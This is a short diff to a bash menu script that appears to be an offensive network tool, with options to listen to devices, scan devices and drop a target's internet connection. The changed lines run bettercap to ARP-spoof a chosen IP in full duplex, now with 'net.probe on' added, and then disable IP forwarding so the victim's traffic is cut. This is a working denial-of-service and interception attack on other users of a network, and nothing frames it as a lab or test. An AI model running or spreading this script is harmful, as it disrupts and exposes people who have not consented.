@@ -34,6 +34,7 @@ ___________       __     _____
 EOF
 echo -e "${NC}"
 echo -e "${WHITE}"
+
 echo ""
 echo "1) Listen to devices"
 echo "2) Scan devices "
@@ -42,6 +43,7 @@ echo "4) exit"
 echo ""
 
 echo -e "${NC}"
+
 read -p "make a selection : " secim2
 
 if [[ "$secim2" == "1" ]]; then
@@ -90,9 +92,9 @@ elif [[ "$secim2" == "3" ]]; then
  sleep 2
  echo "The user's internet connection is dropping."
 
-sudo bettercap -iface "$face2" -eval "set arp.spoof.targets $ip2; set arp.spoof.fullduplex true; arp.spoof on" > /dev/null 2>&1 &
+sudo bettercap -iface "$face2" -eval "net.probe on; set arp.spoof.targets $ip2; set arp.spoof.fullduplex true; arp.spoof on" > /dev/null 2>&1 &
  BETTERCAP_PID=$!
- sleep 2
+ sleep 3
 
  sudo sysctl -w net.ipv4.ip_forward=0 
 
